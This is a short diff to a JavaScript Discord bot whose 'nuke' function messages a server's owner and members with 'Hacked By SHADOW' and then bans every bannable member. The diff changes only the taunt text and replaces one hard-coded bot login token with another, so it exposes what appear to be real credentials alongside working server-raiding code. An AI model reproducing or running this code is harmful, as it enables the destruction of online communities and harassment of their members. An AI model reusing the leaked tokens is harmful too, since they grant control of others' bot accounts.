@@ -1968,14 +1968,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - SHADOW <@318705077734998017>   ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW    ').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('Hacked By SHADOW <@318705077734998017> ').catch(e => { return void e; });
+      await m.send('Hacked By SHADOW  ').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -2029,4 +2029,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NTI4OTU2NDI2MzU0MTYzNzEz.Dwp0zw.QB5NKzLwnlGLmJh7xkfvpyVehOc")
+LOka.login("NTE1NDQwNTM3NTYyNzc1NTUy.DtlKqA.rk-5eb5LYS5V1y-SMv4furr4SvE")
